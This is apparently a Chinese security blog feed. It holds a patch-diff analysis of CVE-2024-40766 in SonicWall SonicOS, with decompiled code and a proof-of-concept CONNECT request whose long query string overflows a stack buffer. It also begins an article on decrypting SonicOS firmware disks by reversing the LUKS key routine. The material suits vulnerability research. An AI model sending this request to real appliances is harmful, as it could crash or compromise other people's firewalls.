microcode, sig 0x00006004, pf_mask 0x00, 1F00-03-10, rev 0x1d00, size 2048</span><br><span class="line">14725724      0xE0B25C        Intel x86 or x64 microcode, sig 0xffc0000e, pf_mask 0x00, 1F00-04-10, rev 0x1d00, size 12289</span><br><span class="line">14725852      0xE0B2DC        Intel x86 or x64 microcode, sig 0x0000d03b, pf_mask 0x00, 1F00-04-10, rev 0x1d00, size 2048</span><br><span class="line">14727740      0xE0BA3C        Intel x86 or x64 microcode, sig 0x0000a0a3, pf_mask 0x00, 1F00-04-10, rev 0x1d00, size 2048</span><br><span class="line">14731164      0xE0C79C        Intel x86 or x64 microcode, sig 0x0000889f, pf_mask 0x00, 1F00-05-10, rev 0x1d00, size 2048</span><br><span class="line">14750300      0xE1125C        Intel x86 or x64 microcode, sig 0x0000b063, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 2048</span><br><span class="line">14750460      0xE112FC        Intel x86 or x64 microcode, sig 0x0780d86a, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 53248</span><br><span class="line">14750652      0xE113BC        Intel x86 or x64 microcode, sig 0x7f8088a5, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 20480</span><br><span class="line">14751036      0xE1153C        Intel x86 or x64 microcode, sig 0x000078c5, pf_mask 0x00, 1F00-09-10, rev 0x1d00, size 2048</span><br><span class="line">14791868      0xE1B4BC        Intel x86 or x64 microcode, sig 0x008068f1, pf_mask 0x00, 1F00-12-10, rev 0x1d00, size 4096</span><br><span class="line">14793532      0xE1BB3C        Intel x86 or x64 microcode, sig 0x0380a053, pf_mask 0x00, 1F00-13-10, rev 0x1d00, size 16384</span><br><span class="line">14794236      0xE1BDFC        Intel x86 or x64 microcode, sig 0x00006867, pf_mask 0x00, 1F00-13-10, rev 0x1d00, size 2048</span><br><span class="line">14798108      0xE1CD1C        Intel x86 or x64 microcode, sig 0x1f80c050, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 12288</span><br><span class="line">14798300      0xE1CDDC        Intel x86 or x64 microcode, sig 0x3f80c064, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 57344</span><br><span class="line">14798396      0xE1CE3C        Intel x86 or x64 microcode, sig 0xff80f06f, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 1</span><br><span class="line">14798428      0xE1CE5C        Intel x86 or x64 microcode, sig 0x00804875, pf_mask 0x00, 1F00-14-10, rev 0x1d00, size 8192</span><br><span class="line">14812508      0xE2055C        Intel x86 or x64 microcode, sig 0xffc0288b, pf_mask 0x00, 1F00-16-10, rev 0x1d00, size 20480</span><br><span class="line">14814428      0xE20CDC        Intel x86 or x64 microcode, sig 0x000040e4, pf_mask 0x00, 1F00-16-10, rev 0x1d00, size 2048</span><br><span class="line">14817340      0xE2183C        Intel x86 or x64 microcode, sig 0x000000b9, pf_mask 0x00, 1F00-17-10, rev 0x1d00, size 2048</span><br><span class="line">14825500      0xE2381C        Intel x86 or x64 microcode, sig 0x0380c058, pf_mask 0x00, 1F00-19-10, rev 0x1d00, size 8192</span><br></pre></td></tr></table></figure></div>

<p>直接解压，会得到一个叫做 195 的 ELF 文件，这个实际上就是系统主要程序，内部实现了很多功能，包括管理端口 WEB 相关功能。</p>
<p>利用 Bindiff 对比新旧两个程序，得到结果显示差异很小，仅有 20 余个函数发生变化。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2024-40766-1.png"
                     
                ></p>
<p>逐个分析发生变化的函数，定位到疑似漏洞点，代码列举如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 旧版本</span></span><br><span class="line"><span class="keyword">if</span> ( *(v36 + <span class="number">32</span>) == <span class="number">6LL</span> )             <span class="comment">// CONNECT 类型</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">36</span>), aWxaappliance_0) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_3) || <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">52</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v45 = woHandleSshConnect(v43, v42, v44) &lt; <span class="number">0</span>;</span><br><span class="line">    LABEL_361:</span><br><span class="line">      v182 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v45 )</span><br><span class="line">        v182 = <span class="number">0</span>;</span><br><span class="line">      v220 = v182;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_367;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">36</span>), aSonicpoint_0) )<span class="comment">// (sonicpoint)-&gt;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_3) || <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v46 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v47 = v32;</span><br><span class="line">        v48 = *(v36 + <span class="number">52</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v46 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v47 = v32;</span><br><span class="line">        v48 = *(v36 + <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v45 = spnHandleSshConnect(v47, v46, v48) &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_361;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新版本</span></span><br><span class="line"><span class="keyword">if</span> ( *(v36 + <span class="number">32</span>) == <span class="number">6LL</span> )             <span class="comment">// CONNECT 类型</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">36</span>), aSonicpoint_0) &amp;&amp; sub_829B0BDC(v32) &amp;&amp; sub_829B1D20(v32) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_3) || <span class="built_in">strstr</span>(*(v36 + <span class="number">52</span>), aProxyAuthoriza_2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">52</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v42 = *(v36 + <span class="number">36</span>);</span><br><span class="line">        v43 = v32;</span><br><span class="line">        v44 = *(v36 + <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v45 = spnHandleSshConnect(v43, v42, v44) &lt; <span class="number">0</span>;</span><br><span class="line">    LABEL_357:</span><br><span class="line">      v179 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v45 )</span><br><span class="line">        v179 = <span class="number">0</span>;</span><br><span class="line">      v217 = v179;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_363;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对比可以发现新版本去掉了调用 woHandleSshConnect 的代码，并且在调用 spnHandleSshConnect 之前新增了调用函数 sub_829B0BDC 和 sub_829B1D20</p>
<p>实际上这个函数是处理发往管理端口 HTTP 请求的入口点，v36 + 32 表示当前的请求方法，6 表示 CONNECT 方法，v36 + 36 表示请求的 URL，v36 + 52 表示请求头。</p>
<p>也就是说当发送类似以下请求时，会触发 woHandleSshConnect 函数</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONNECT /test?(wxaappliance)-&gt;aaa HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Proxy-Authorization: test</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">woHandleSshConnect</span><span class="params">(__int64 unknow, __int64 maybe_query_string, __int64 maybe_header)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strstr</span>(maybe_query_string, aWxaappliance_0);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    param = (v5 + maybe_strlen(aWxaappliance_0));</span><br><span class="line">    v8 = sub_82860ACC(param, maybe_header, v14);</span><br><span class="line">    v9 = sub_82853D40(unknow, param, v8, <span class="number">0LL</span>);</span><br><span class="line">    v10 = v9;</span><br><span class="line">    v11 = v9 &lt; <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = sub_8286EA04(<span class="number">3LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( sub_8286EC70(v12, <span class="number">1LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(v12 + <span class="number">76</span>) = v10;</span><br><span class="line">        *(v12 + <span class="number">72</span>) = unknow;</span><br><span class="line">        sub_825E0284(unknow, <span class="number">65539LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        sub_82D9AB58(v13, <span class="string">&quot;tSslvpnProxy%d&quot;</span>, unknow);</span><br><span class="line">        *(v12 + <span class="number">84</span>) = sub_827ED488(v13, <span class="number">50LL</span>, <span class="number">0LL</span>, <span class="number">20000LL</span>, sub_82852A34, v12, <span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( LOG(aNotice, aWohandlesshcon, <span class="number">2364LL</span>) )</span><br><span class="line">      sub_82330978(<span class="string">&quot;in %s error: pQueryString NULL   \n&quot;</span>, aWohandlesshcon_0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>woHandleSshConnect 函数又会调用 sub_82860ACC</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_82860ACC</span><span class="params">(__int64 buf, __int64 a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_8284D554(buf, v13);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终会调用 sub_8284D554 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_8284D554</span><span class="params">(__int64 buf, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !buf || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *buf == <span class="string">&#x27;[&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v13, <span class="number">0LL</span>, <span class="number">124LL</span>);</span><br><span class="line">    maybe_strnpy(&amp;v13, buf, <span class="number">123LL</span>);</span><br><span class="line">    v5 = <span class="built_in">strchr</span>(&amp;v13, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    v6 = v5;</span><br><span class="line">    v7 = v5 == <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = (v6 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *v8 == <span class="number">58LL</span> )</span><br><span class="line">        *v2 = maybe_atoi((v8 + <span class="number">1</span>));</span><br><span class="line">      *(v8 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      v9 = maybe_strlen(buf);</span><br><span class="line">      maybe_strnpy(buf, v14, v9 - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>    <span class="comment">// [1]</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    v11 = v10;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &amp;&amp; <span class="built_in">strchr</span>(buf, <span class="string">&#x27;.&#x27;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    v7 = sub_825DC8E8(buf) != <span class="number">0</span>;    <span class="comment">// [2]</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    v12 = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    v11 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      *v2 = maybe_atoi((v11 + <span class="number">1</span>));</span><br><span class="line">      *v11 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当 buf 即 Query String 不以 <code>[</code> 字符开头时，来到 <code>[1]</code> 处，接着会在 <code>[2]</code> 处调用 sub_825DC8E8 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_825DC4B8</span><span class="params">(__int64 buf, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="type">char</span> v32[<span class="number">46</span>]; <span class="comment">// [sp+10h] [-50h] BYREF</span></span><br><span class="line">  _BYTE v33[<span class="number">16</span>]; <span class="comment">// [sp+40h] [-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [sp+50h] [-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+54h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+58h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = v32;</span><br><span class="line">  v35 = a2;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v32, <span class="number">0LL</span>, <span class="keyword">sizeof</span>(v32));</span><br><span class="line">  <span class="keyword">if</span> ( !buf || !v35 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_834DE5C8 )</span><br><span class="line">      sub_82D9B0B8(aState1NullPoin);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v32, buf);    <span class="comment">// [3]</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>很明显在 <code>[3]</code> 处，代码会调用 strcpy 尝试将用户可控的数据拷贝到 v32，而 v32 是一个位于 stack 的固定长度的缓冲区，在拷贝时缺少长度验证，这将导致栈溢出。</p>
<p>一个可能的 POC 如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONNECT /test?(wxaappliance)-&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Proxy-Authorization: test</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>该二进制程序也没有开启 canary 等保护措施，所以理论上可以利用此漏洞实现命令执行，v32 变量下方可能存在某些关键数据结构，也许通过溢出覆盖这些结构就可以实现未授权访问等。</p>
<p>由于我没有合适的设备进行测试，该漏洞能否利用？如何利用？就留给感兴趣的读者研究了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>本文简要介绍了 CVE-2024-40766 漏洞，通过补丁对比找到了漏洞可能的位置并分析了漏洞成因。该漏洞评分为 9.3 属严重漏洞，建议使用 SonicWall 相关设备的用户及时更新最新补丁。</p>
<p><a class="link"   href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015" >https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a href="https://wzt.ac.cn/2022/02/08/sonicwall_dec1/">https://wzt.ac.cn/2022/02/08/sonicwall_dec1/</a></p>
<p><a href="https://wzt.ac.cn/2024/09/05/sonicwall_dec2/">https://wzt.ac.cn/2024/09/05/sonicwall_dec2/</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>SonicOS 固件解密 (2)</title>
    <url>/2024/09/05/sonicwall_dec2/</url>
    <content><![CDATA[<p>本文介绍一些 SonicWall SonicOS 固件解密的思路。</p>
<span id="more"></span>

<p>本 Blog 曾发布过一篇关于如何解密 SonicWall NSv 系统的<a href="https://wzt.ac.cn/2022/02/08/sonicwall-nsv-unpack">文章</a>，漫长的时间过去了，厂商也对该系统进行了数次升级迭代，现在我们来看看新版本中是否实现了更多安全措施。</p>
<p>本文提及的环境可以在<a class="link"   href="https://pan.baidu.com/s/1MJG7QU4tU9M6ZCNVL89lIQ?pwd=raw4" >网盘<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>获取，相关工具可以在 <a class="link"   href="https://github.com/rrrrrrri/sonicwall-gadgets" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 获取。</p>
<h2 id="SonicOS-7-0"><a href="#SonicOS-7-0" class="headerlink" title="SonicOS 7.0"></a>SonicOS 7.0</h2><p>前篇文章分析的系统基于 SonicOS 6.0，SonicWall 于 2023 年发布了新的 GEN 7 系统，根据发布说明，该系统在多个方面进行了改进。我们以 7.0.1_5161 为例来看看新的系统是否修改了磁盘加密逻辑。</p>
<p>导入虚拟镜像后启动，等待系统完成安装过程，之后将磁盘挂载到 Linux 中分析，通过 lsblk 命令可以看到磁盘具有 7 个分区</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdb                                                                                     </span><br><span class="line">├─sdb1 vfat        FAT16 EFI-SYSTEM 3115-E9D4                                           </span><br><span class="line">├─sdb2                                                                                  </span><br><span class="line">├─sdb3 crypto_LUKS 1                a75000be-2dc9-11e8-bddb-67945b040d06                </span><br><span class="line">├─sdb4                                                                                  </span><br><span class="line">├─sdb6 crypto_LUKS 1                664f41bc-3bdb-11e8-a9f1-37e7a8e911e8                </span><br><span class="line">├─sdb7 crypto_LUKS 1                77f38900-3d70-11e8-9e8c-8b99c51126e1                </span><br><span class="line">└─sdb9 crypto_LUKS 1                9943fac6-37f1-11e8-bbd4-4b1d323a5df2</span><br></pre></td></tr></table></figure></div>

<p>其中 3、6、7、9 这 4 个分区依然是 LUKS 加密的，可以推测在 7.0 版本的系统中，还没有修改磁盘加密逻辑。</p>
<p>前篇文章是通过调试 luks 模块从内存中 dump 密钥实现磁盘解密，这种方法比较麻烦且容易出现错误，这次我们来分析一下具体的密钥生成算法是什么。</p>
<p>解密逻辑位于 luks.mod 中，关键函数 <code>sub_0</code>。该模块应该属于 <a class="link"   href="https://www.gnu.org/software/grub/grub-download.html" >grub 项目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的一部分，通过搜索找到源代码位于 luks.c 的 <code>luks_recover_key</code> 函数。对比源码发现，SonicWall 的开发者修改了 LUKS 相关逻辑，在 <code>luks_recover_key</code> 函数中会尝试从本地文件或者磁盘头部读取密钥信息，并自动对磁盘进行解密。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">luks_recover_key</span><span class="params">(_QWORD *a1, __int64 a2, __int64 a3, __int64 *a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = &amp;v53;</span><br><span class="line">  v7 = <span class="number">62LL</span>;</span><br><span class="line">  v52 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5 = <span class="number">0</span>;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">    --v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    grub_file_seek(a3, <span class="number">0LL</span>);</span><br><span class="line">    v9 = grub_file_read(a3, disk_data, <span class="number">592LL</span>);</span><br><span class="line">    result = <span class="number">14LL</span>;</span><br><span class="line">    v11 = v9 == <span class="number">592</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = grub_disk_read(a1, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">592LL</span>, disk_data);    <span class="comment">// [1]</span></span><br><span class="line">    v11 = result == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  grub_puts_(<span class="string">&quot;Loading...&quot;</span>);    <span class="comment">// [2]</span></span><br><span class="line">  v12 = _byteswap_ulong(disk_data[<span class="number">27</span>]);</span><br><span class="line">  v38 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt; <span class="number">0x80</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = <span class="string">&quot;key is too long&quot;</span>;</span><br><span class="line">    v17 = <span class="number">9LL</span>;</span><br><span class="line">    <span class="keyword">return</span> grub_error(v17, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">1LL</span>;</span><br><span class="line">  v15 = &amp;disk_data[<span class="number">63</span>];        <span class="comment">// [3]</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( disk_data[v13 + <span class="number">52</span>] == <span class="number">0xF371AC00</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = _byteswap_ulong(disk_data[v13 + <span class="number">63</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( v14 &lt; v18 )</span><br><span class="line">        v14 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 += <span class="number">12LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 != <span class="number">96</span> );</span><br><span class="line">  v19 = grub_malloc(v38 * v14, &amp;disk_data[<span class="number">63</span>], <span class="number">384LL</span>, &amp;disk_data[<span class="number">52</span>]);</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    <span class="keyword">return</span> grub_errno;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v21 = *(&amp;disk_data[<span class="number">28</span>] + v20++);</span><br><span class="line">    v47[v20 + <span class="number">19</span>] = v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v20 != <span class="number">20</span> );</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v15) = *(&amp;disk_data[<span class="number">33</span>] + i);</span><br><span class="line">    v47[i + <span class="number">40</span>] = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = &amp;v48;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j != <span class="number">52</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = &amp;v49[-j - <span class="number">1</span>];</span><br><span class="line">    LOBYTE(v25) = v47[j + <span class="number">20</span>] ^ v49[-j - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v25 &lt;= <span class="number">0x1F</span>u )</span><br><span class="line">      v25 = (v25 | <span class="number">0x20</span>);</span><br><span class="line">    v49[j] = v25;</span><br><span class="line">  &#125;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v26 = <span class="number">2</span> - (a4 == <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v43 = a5;</span><br><span class="line">    <span class="keyword">if</span> ( !a4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_38:</span><br><span class="line">    v31 = &amp;disk_data[<span class="number">54</span>];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k != <span class="number">8</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(v31 - <span class="number">2</span>) == <span class="number">-210654208</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">246LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;Trying keyslot %d\n&quot;</span>, k);</span><br><span class="line">        v32 = grub_crypto_pbkdf2(*(a2 + <span class="number">88</span>), a4, v43, v31, <span class="number">32LL</span>, _byteswap_ulong(*(v31 - <span class="number">1</span>)), v51, v38);    <span class="comment">// [5]</span></span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">263LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;PBKDF2 done\n&quot;</span>);</span><br><span class="line">        v33 = grub_cryptodisk_setkey(a2, v51, v38);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">        v34 = _byteswap_ulong(v31[<span class="number">8</span>]);</span><br><span class="line">        v35 = v38 * _byteswap_ulong(v31[<span class="number">9</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( a3 )</span><br><span class="line">        &#123;</span><br><span class="line">          grub_file_seek(a3, v34 &lt;&lt; <span class="number">9</span>);</span><br><span class="line">          <span class="keyword">if</span> ( grub_file_read(a3, v19, v35) != v35 )</span><br><span class="line">          &#123;</span><br><span class="line">            v36 = <span class="number">14</span>;</span><br><span class="line">LABEL_46:</span><br><span class="line">            v39 = v36;</span><br><span class="line">            grub_free(v19);</span><br><span class="line">            <span 